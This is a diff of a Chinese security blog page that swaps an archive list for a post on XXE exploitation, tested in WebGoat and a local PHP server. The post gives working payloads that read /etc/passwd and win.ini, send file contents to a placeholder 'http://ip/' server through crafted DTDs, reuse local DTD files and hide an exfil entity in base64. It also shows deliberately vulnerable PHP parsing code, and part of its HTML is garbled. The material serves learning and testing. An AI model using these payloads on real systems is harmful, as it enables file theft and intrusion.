@@ -6,14 +6,18 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="http://yoursite.com">
-  <title>Archives | Halfblue</title>
+  <title>xxe从入门到入门 | Halfblue</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta property="og:type" content="website">
-<meta property="og:title" content="Halfblue">
-<meta property="og:url" content="http://yoursite.com/archives/index.html">
+  <meta name="description" content="最近想把高危漏洞都总结一下，虽然都利用过，但没有好好整理，用的时候总会手忙脚乱。先从xxe开始">
+<meta property="og:type" content="article">
+<meta property="og:title" content="xxe从入门到入门">
+<meta property="og:url" content="http://yoursite.com/2020/05/26/xxe从入门到入门/index.html">
 <meta property="og:site_name" content="Halfblue">
+<meta property="og:description" content="最近想把高危漏洞都总结一下，虽然都利用过，但没有好好整理，用的时候总会手忙脚乱。先从xxe开始">
+<meta property="og:updated_time" content="2020-05-31T02:56:57.993Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Halfblue">
+<meta name="twitter:title" content="xxe从入门到入门">
+<meta name="twitter:description" content="最近想把高危漏洞都总结一下，虽然都利用过，但没有好好整理，用的时候总会手忙脚乱。先从xxe开始">
   
     <link rel="alternative" href="/atom.xml" title="Halfblue" type="application/atom+xml">
   
@@ -143,373 +147,140 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            
+            <article id="post-xxe从入门到入门" class="article article-type-post " itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
   
+    <h1 class="article-title" itemprop="name">
+      xxe从入门到入门
+    </h1>
   
-    
-    
-      
-      
-      <section class="archives-wrap">
-        <div class="archive-year-wrap">
-          <a href="/archives/2020" class="archive-year">2020</a>
-        </div>
-        <div class="archives">
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2020/05/26/xxe从入门到入门/" class="archive-article-date">
+
+        
+        <a href="/2020/05/26/xxe从入门到入门/" class="archive-article-date">
   	<time datetime="2020-05-26T13:09:43.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-05-26</time>
 </a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2020/05/26/xxe从入门到入门/">xxe从入门到入门</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
+        
+      </header>
     
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2020/05/25/fastjson-rce利用踩坑/" class="archive-article-date">
-  	<time datetime="2020-05-25T02:21:58.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-05-25</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2020/05/25/fastjson-rce利用踩坑/">fastjson rce利用踩坑</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2020/04/24/java反序列化回显自闭之旅/" class="archive-article-date">
-  	<time datetime="2020-04-24T08:50:08.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-04-24</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2020/04/24/java反序列化回显自闭之旅/">java反序列化回显自闭之旅</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags"></i>
-		<ul class="article-tag-list">
-			 
-        <li class="article-tag-list-item">
-        	<a href="javascript:void(0)" class="article-tag-list-link color2">java安全</a>
-        </li>
+    <div class="article-entry" itemprop="articleBody">
       
-		</ul>
-	</div>
+        <p>最近想把高危漏洞都总结一下，虽然都利用过，但没有好好整理，用的时候总会手忙脚乱。先从xxe开始<a id="more"></a><br>漏洞测试环境用的是java11+最新版webgoat，其中有专门的xxe部分。先简单介绍下xml的结构，比如有一个xml<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"UTF-8"</span><span class="meta">?&gt;</span></span></div><div class="line"><span class="tag">&lt;<span class="name">Person</span>&gt;</span></div><div class="line">  <span class="tag">&lt;<span class="name">Name</span>&gt;</span>Bob<span class="tag">&lt;/<span class="name">Name</span>&gt;</span></div><div class="line">  <span class="tag">&lt;<span class="name">Age</span>&gt;</span>18<span class="tag">&lt;/<span class="name">Age</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">Person</span>&gt;</span></div></pre></td></tr></table></figure></p>
+<p>其中第一行是元数据，带上就行。person是根元素，一个xml只有一个,里面的name和age是子元素，可以有多个。<br>xml标签中不能有特殊符号，比如尖括号等，因为会混淆格式。这时可以用实体(entites)解决。实体相当于变量，可以声明后多处引用。实体在DTD(document tyoe definition)部分被定义。加入DTD的xml比如<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"UTF-8"</span><span class="meta">?&gt;</span></span></div><div class="line"><span class="meta">&lt;!DOCTYPE Person [</span></div><div class="line">	&lt;!ENTITY name "Bob"&gt;</div><div class="line">]&gt;</div><div class="line"><span class="tag">&lt;<span class="name">Person</span>&gt;</span></div><div class="line">  <span class="tag">&lt;<span class="name">Name</span>&gt;</span>&amp;name;<span class="tag">&lt;/<span class="name">Name</span>&gt;</span></div><div class="line">  <span class="tag">&lt;<span class="name">Age</span>&gt;</span>18<span class="tag">&lt;/<span class="name">Age</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">Person</span>&gt;</span></div></pre></td></tr></table></figure></p>
+<p>DOCTYPE标识符代表DTD，其中定义了name变量。这种就是普通的引用实体。还有种实体是参数实体，后面再介绍。<br>xxe的全称是xml external entites也就是外部实体(注入)，外部实体也就是从外部，比如本地文件或网络获取内容，自然可能会产生文件读取或ssrf之类的漏洞。比如<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;!DOCTYPE xxe [</span></div><div class="line">&lt;!ENTITY test SYSTEM "file:///etc/passwd"&gt;</div><div class="line">]&gt;</div><div class="line"><span class="tag">&lt;<span class="name">output</span>&gt;</span>&amp;test;<span class="tag">&lt;/<span class="name">output</span>&gt;</span></div></pre></td></tr></table></figure></p>
+<p>SYSTEM关键字就是外部实体的标志，会访问后面的url，这样输出就会是passwd文件的内容。<br>这也就是最简单的xxe利用，直接回显(in-band)的xxe。和sql注入类似，除此之外还有报错(error-based)xxe和盲(blind)xxe也就是带外(out-of-band)/OOB)xxe。利用方法也更复杂一些。</p>
+<p>###blind xxe<br>盲xxe也是最常见的类型，需要带外传输数据。那么很自然想到用http请求传递文件内容。这里就需要使用前面说过的参数实体。参数实体只能在DTD中引用，可以用一个实体给另一个实体赋值。但注意下面这种嵌套的用法(%name)只能在外部DTD中使用(文档是这么说明的，但实际实现不同语言和解析器会有差异)，也就是需要单独创建个DTD文件放在服务器上。<br><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">&lt;!--name.dtd--&gt;</div><div class="line">&lt;!ENTITY % name "Bob" &gt;</div><div class="line">&lt;!ENTITY % outer "&lt;!ENTITY inner 'my name is %name;'&gt;"&gt; </div><div class="line">%outer;</div><div class="line">&lt;!--main.xml--&gt;</div><div class="line">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</div><div class="line">&lt;!DOCTYPE data SYSTEM "http://ip/name.dtd"&gt;</div><div class="line">&lt;Person&gt;</div><div class="line">  &lt;Name&gt;&amp;inner;&lt;/Name&gt;</div><div class="line">  &lt;Age&gt;18&lt;/Age&gt;</div><div class="line">&lt;/Person&gt;</div></pre></td></tr></table></figure></p>
+<p>那么带外传输数据可以这样，比方写个1.txt内容是test xxe，运行后可以在监听端收到GET /test%20xxe的请求<br><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">&lt;!--evil.dtd--&gt;</div><div class="line">&lt;!ENTITY % passwd SYSTEM "file:///C:/xxx/1.txt"&gt;</div><div class="line">&lt;!ENTITY % wrapper "&lt;!ENTITY send SYSTEM 'http://ip/%passwd;'&gt;"&gt;</div><div class="line">%wrapper;</div><div class="line">&lt;!--main.xml--&gt;</div><div class="line">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</div><div class="line">&lt;!DOCTYPE data SYSTEM "http://ip/evil.dtd"&gt;</div><div class="line">&lt;output&gt;&amp;send;&lt;/output&gt;</div></pre></td></tr></table></figure></p>
+<p>也可以用参数实体，这时DTD中嵌套实体部分需要编码<br><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">&lt;!--evil.dtd--&gt;</div><div class="line">&lt;!ENTITY % passwd SYSTEM "file:///C:/xxx/1.txt"&gt;</div><div class="line">&lt;!ENTITY % wrapper "&lt;!ENTITY &amp;#x25; send SYSTEM 'http://ip/%passwd;'&gt;"&gt;</div><div class="line">%wrapper;</div><div class="line">&lt;!--main.xml--&gt;</div><div class="line">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</div><div class="line">&lt;!DOCTYPE data [</div><div class="line">	&lt;!ENTITY % dtd SYSTEM "http://ip/evil.dtd"&gt;</div><div class="line">%dtd;</div><div class="line">%send;</div><div class="line">]&gt;</div><div class="line">&lt;output&gt;123&lt;/output&gt;</div></pre></td></tr></table></figure></p>
+<p>这样就相当于直接引入实体send，请求ip加passwd信息。看上去很完美。<br>但实际上这样还是会出现问题，比如文件中包含特殊字符(主要是尖括号)和换行时都会导致xml或url的解析问题，这就需要新的解决方法。<br>解决尖括号的方法是利用CDATA<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;![CDATA[ &lt;text&gt; ]]&gt;</div></pre></td></tr></table></figure></p>
+<p>其中的标签不会被解析，那么就可以用CDATA把读取的文件内容包起来，在外部DTD中拼接，比如1.txt中内容改为asd<button onmouseover="alert(1)"><br><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">&lt;!ENTITY % start "&lt;![CDATA["&gt;   </div><div class="line">&lt;!ENTITY % file SYSTEM "file:///C:/xxx/1.txt"&gt;  </div><div class="line">&lt;!ENTITY % end "]]&gt;"&gt;</div><div class="line">&lt;!ENTITY % wrapper "&lt;!ENTITY all '%start;%file;%end;'&gt;"&gt; </div><div class="line">%wrapper;</div></pre></td></tr></table></figure></button></p>
+<p>然后在xml中调用all实体就可以获取带有尖括号的字符串了，某些情况下还可以形成存储xss。<br>本地环境我试了下，回显时会受到尖括号影响，带外时不需要CDATA也可以正常获取带尖括号的数据，但是无法正常获取带#号的数据，因为按url处理掉了。<br>但是带外的过程还会有个问题，就是出现换行符时，url解析会报错。php环境的话很简单，用filter来base64一下就可以了。java中需要用ftp协议，并且只有低版本(leadroyal给出 <7u141 和="" <8u162)可以，高版本也对换行做了限制。并且ftp协议中?、#等特殊符号也会被截断。利用工具https:="" github.com="" landgrey="" xxe-ftp-server="" 所以高版本java读取多行文件就只能依赖服务器的报错了，比如dtd内容为="" <figure="" class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&lt;!ENTITY % passwd SYSTEM "file:///C:/wamp/1.txt"&gt;</div><div class="line">&lt;!ENTITY % wrapper "&lt;!ENTITY send SYSTEM '%passwd;'&gt;"&gt;</div><div class="line">%wrapper;</div></pre></td></tr></table></7u141></p>
+<p>这样服务器就会报一个no protocol: 文件内容，并且其中所有内容包括多行内容及特殊字符都会打印。一次性解决上面的问题。这就属于报错xxe。<br>前面说的都是利用外部DTD，那不允许请求外网服务器DTD怎么办？还有种攻击手法是利用本地DTD。这种手法也可以算一种更复杂的OOB的方法。首先需要利用本地存在的DTD文件，每个系统都有一些内置的，比如ubuntu系统自带的/usr/share/yelp/dtd/docbookx.dtd，这里存在许多参数实体，随便选一个比如ISOamsa，然后重写它，最开始的版本是这么写的<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span><span class="meta">?&gt;</span></span></div><div class="line"><span class="meta">&lt;!DOCTYPE message [</span></div><div class="line">    &lt;!ENTITY % remote SYSTEM "/usr/share/yelp/dtd/docbookx.dtd"&gt;</div><div class="line">    &lt;!ENTITY % file SYSTEM "file:///flag"&gt;</div><div class="line">    &lt;!ENTITY % ISOamsa '</div><div class="line">        &lt;!ENTITY &amp;#x25; eval "&lt;!ENTITY &amp;#x26;#x25; send SYSTEM &amp;#x27;http://myip/?&amp;#x25;file;&amp;#x27;&gt;"&gt;</div><div class="line">        &amp;#x25;eval;</div><div class="line">        &amp;#x25;send;</div><div class="line">    '&gt; </div><div class="line">    %remote;</div><div class="line">]&gt;</div><div class="line"><span class="tag">&lt;<span class="name">message</span>&gt;</span>1234<span class="tag">&lt;/<span class="name">message</span>&gt;</span></div></pre></td></tr></table></figure></p>
+<p>其实和前面的方法相比，就是多了一步重写参数实体，但是前面不是说了内部DTD不允许嵌套实体吗？这里用的是外部DTD在内部重写，并且用了三层嵌套。分析下是哪一点起了作用，首先试试外部DTD重写，两层嵌套<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"UTF-8"</span><span class="meta">?&gt;</span></span></div><div class="line"><span class="meta">&lt;!DOCTYPE data [</span></div><div class="line">  &lt;!ENTITY % file SYSTEM "file:///C:/wamp/1.txt"&gt;</div><div class="line">  &lt;!ENTITY % dtd SYSTEM "/usr/share/yelp/dtd/docbookx.dtd"&gt;</div><div class="line">  &lt;!ENTITY % ISOamsa "&lt;!ENTITY &amp;#x25; send SYSTEM 'http://ip/?%file;'&gt;"&gt;</div><div class="line">%dtd;</div><div class="line">%send;</div><div class="line">]&gt;</div></pre></td></tr></table></figure></p>
+<p>失败了，和之前直接在内部DTD引用参数实体一样。<br>那么改成内部DTD，三层嵌套呢？<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span><span class="meta">?&gt;</span></span></div><div class="line"><span class="meta">&lt;!DOCTYPE message [</span></div><div class="line">    &lt;!ENTITY % file SYSTEM "file:///C:/wamp/1.txt"&gt;</div><div class="line">    &lt;!ENTITY % test '</div><div class="line">        &lt;!ENTITY &amp;#x25; eval "&lt;!ENTITY &amp;#x26;#x25; send SYSTEM &amp;#x27;http://ip/?&amp;#x25;file;&amp;#x27;&gt;"&gt;</div><div class="line">        &amp;#x25;eval;</div><div class="line">        &amp;#x25;send;</div><div class="line">    '&gt; </div><div class="line">%test;</div><div class="line">]&gt;</div></pre></td></tr></table></figure></p>
+<p>还是失败了，网上有的帖子这样是可以的，但他们的环境都是php的，可能是解析器不同。<br>试试四层？<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"UTF-8"</span><span class="meta">?&gt;</span></span></div><div class="line"><span class="meta">&lt;!DOCTYPE data [</span></div><div class="line">    &lt;!ENTITY % para1 SYSTEM "file:///C:/wamp/1.txt"&gt;</div><div class="line">    &lt;!ENTITY % para4 "</div><div class="line">	&lt;!ENTITY &amp;#x25; para '</div><div class="line">		&lt;!ENTITY &amp;#x26;#x25; para2 &amp;#x22;&lt;!ENTITY &amp;#x26;#x26;#x25; error SYSTEM &amp;#x26;#x27;http://ip/&amp;#x26;#x25;para1;&amp;#x26;#x27;&gt;&amp;#x22;&gt;</div><div class="line">	&amp;#x26;#x25;para2;</div><div class="line">	&amp;#x26;#x25;error;</div><div class="line">	'&gt;</div><div class="line">	&amp;#x25;para;</div><div class="line">"&gt;</div><div class="line">%para4;</div><div class="line">]&gt;</div></pre></td></tr></table></figure></p>
+<p>还是不行，引入外部DTD的话可以。所以java11环境下应该是只有外部DTD+三层以上嵌套调用才能解析，否则是不行的。也可以改成报错的版本，把send那里的url改了就行，这也是不出网情况下唯一的解决方案了。</p>
+<p>###利用方式<br>有回显–&gt;回显xxe<br>有报错–&gt;外网DTD报错、本地DTD报错<br>无报错–&gt;外网DTD盲xxe、本地DTD盲xxe</p>
+<p>###漏洞点<br>首先如果请求里有明显xml标签就可能有xxe。<br>如果请求是json，转化成xml格式可能存在xxe，这是后端restful写法导致的。<br>再就是其他格式文档，docx、xslx、pptx、pdf、svg等等，如果被解析了的话都有可能存在xxe。</p>
+<p>###一些差异<br>前面自己的实验和网上的帖子有很多矛盾的地方，怀疑是解析器的区别。所以又启动了一个php7.3.4+xml2.9.9的服务测试下，服务端代码<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">libxml_disable_entity_loader(<span class="keyword">false</span>);</div><div class="line">$xmlfile = file_get_contents(<span class="string">'php://input'</span>);</div><div class="line">$dom = <span class="keyword">new</span> DOMDocument();</div><div class="line">$dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);</div><div class="line">$creds = simplexml_import_dom($dom);</div><div class="line">print_r($creds);</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
+<p>网上都用的这个代码，很奇怪我没有开启allow_url_include但也可以用php://input。好像是file_get_contents可以，include不行，跟网上说的又不一样。<br>和文档的说明不同，这段php代码可以在内部DTD中嵌套实体<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"UTF-8"</span><span class="meta">?&gt;</span></span></div><div class="line"><span class="meta">&lt;!DOCTYPE data [</span></div><div class="line">&lt;!ENTITY % name "Bob" &gt;</div><div class="line">&lt;!ENTITY % outer "&lt;!ENTITY inner 'my name is &amp;#x25;name;'&gt;"&gt; </div><div class="line">%outer;</div><div class="line">]&gt;</div><div class="line"><span class="tag">&lt;<span class="name">Name</span>&gt;</span>&amp;inner;<span class="tag">&lt;/<span class="name">Name</span>&gt;</span></div></pre></td></tr></table></figure></p>
+<p>读文件<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"utf-8"</span><span class="meta">?&gt;</span></span></div><div class="line"><span class="meta">&lt;!DOCTYPE root [</span></div><div class="line">&lt;!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=file:///c:/windows/win.ini"&gt;</div><div class="line">&lt;!ENTITY % all "&lt;!ENTITY send '&amp;#x25;file;'&gt;"&gt;</div><div class="line">%all;</div><div class="line">]&gt;</div><div class="line"><span class="tag">&lt;<span class="name">roottag</span>&gt;</span>&amp;send;<span class="tag">&lt;/<span class="name">roottag</span>&gt;</span></div></pre></td></tr></table></figure></p>
+<p>三层都不需要，两层就可以了，还要啥自行车。<br>不过这是回显条件下的。带外时可以用三层，同样不需要外部DTD<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span><span class="meta">?&gt;</span></span></div><div class="line"><span class="meta">&lt;!DOCTYPE message [</span></div><div class="line">    &lt;!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=file:///C:/wamp/1.txt"&gt;</div><div class="line">    &lt;!ENTITY % test '</div><div class="line">        &lt;!ENTITY &amp;#x25; eval "&lt;!ENTITY &amp;#x26;#x25; send SYSTEM &amp;#x27;http://127.0.0.1:9988/?&amp;#x25;file;&amp;#x27;&gt;"&gt;</div><div class="line">        &amp;#x25;eval;</div><div class="line">        &amp;#x25;send;</div><div class="line">    '&gt; </div><div class="line">%test;</div><div class="line">]&gt;</div></pre></td></tr></table></figure></p>
+<p>还可以利用filter实现双层嵌套带外，顺便绕过某些关键字过滤，php的各种花样都可以用了。<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"utf-8"</span><span class="meta">?&gt;</span></span></div><div class="line"><span class="meta">&lt;!DOCTYPE root [</span></div><div class="line">&lt;!ENTITY % sp SYSTEM "php://filter/resource=data://text/plain;base64,PCFFTlRJVFkgJSBkYXRhIFNZU1RFTSAicGhwOi8vZmlsdGVyL2NvbnZlcnQuYmFzZTY0LWVuY29kZS9yZXNvdXJjZT1maWxlOi8vL0M6L3dhbXAvMS50eHQiPg0KPCFFTlRJVFkgJSBwYXJhbTEgJzwhRU5USVRZIGV4ZmlsIFNZU1RFTSAiaHR0cDovLzEyNy4wLjAuMTo5OTg4LyVkYXRhOyI+Jz4="&gt;</div><div class="line">%sp; </div><div class="line">%param1;</div><div class="line">]&gt;</div><div class="line"><span class="tag">&lt;<span class="name">Name</span>&gt;</span>&amp;exfil;<span class="tag">&lt;/<span class="name">Name</span>&gt;</span></div></pre></td></tr></table></figure></p>
+<p>最好的语言，最好的语言(拱手</p>
+<p>参考链接<br><a href="https://www.youtube.com/watch?v=gjm6VHZa_8s" target="_blank" rel="external">https://www.youtube.com/watch?v=gjm6VHZa_8s</a><br><a href="https://www.freebuf.com/vuls/207639.html" target="_blank" rel="external">https://www.freebuf.com/vuls/207639.html</a><br><a href="https://www.leadroyal.cn/?p=914" target="_blank" rel="external">https://www.leadroyal.cn/?p=914</a><br><a href="https://cloud.tencent.com/developer/article/1500898" target="_blank" rel="external">https://cloud.tencent.com/developer/article/1500898</a><br><a href="https://github.com/LandGrey/xxe-ftp-server" target="_blank" rel="external">https://github.com/LandGrey/xxe-ftp-server</a></p>
 
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2020/04/02/php反序列化的千层套路/" class="archive-article-date">
-  	<time datetime="2020-04-02T13:32:50.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-04-02</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2020/04/02/php反序列化的千层套路/">php反序列化的千层套路</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags"></i>
-		<ul class="article-tag-list">
-			 
-        <li class="article-tag-list-item">
-        	<a href="javascript:void(0)" class="article-tag-list-link color4">CTF</a>
-        </li>
       
-		</ul>
-	</div>
 
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2020/03/28/java反序列化连续剧三/" class="archive-article-date">
-  	<time datetime="2020-03-28T07:59:17.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-03-28</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2020/03/28/java反序列化连续剧三/">java反序列化连续剧三</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags"></i>
-		<ul class="article-tag-list">
-			 
-        <li class="article-tag-list-item">
-        	<a href="javascript:void(0)" class="article-tag-list-link color2">java安全</a>
-        </li>
       
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2020/03/23/java反序列化连续剧二/" class="archive-article-date">
-  	<time datetime="2020-03-23T07:57:16.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-03-23</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2020/03/23/java反序列化连续剧二/">java反序列化连续剧二</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags"></i>
-		<ul class="article-tag-list">
-			 
-        <li class="article-tag-list-item">
-        	<a href="javascript:void(0)" class="article-tag-list-link color2">java安全</a>
-        </li>
+    </div>
+    <div class="article-info article-info-index">
       
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2020/03/21/java反序列化连续剧一/" class="archive-article-date">
-  	<time datetime="2020-03-21T15:26:26.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-03-21</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2020/03/21/java反序列化连续剧一/">java反序列化连续剧一</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags"></i>
-		<ul class="article-tag-list">
-			 
-        <li class="article-tag-list-item">
-        	<a href="javascript:void(0)" class="article-tag-list-link color2">java安全</a>
-        </li>
       
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2020/03/16/最好的语言之javascript原型链污染/" class="archive-article-date">
-  	<time datetime="2020-03-16T14:46:44.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-03-16</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2020/03/16/最好的语言之javascript原型链污染/">最好的语言之javascript原型链污染</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags"></i>
-		<ul class="article-tag-list">
-			 
-        <li class="article-tag-list-item">
-        	<a href="javascript:void(0)" class="article-tag-list-link color4">CTF</a>
-        </li>
       
-		</ul>
-	</div>
 
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
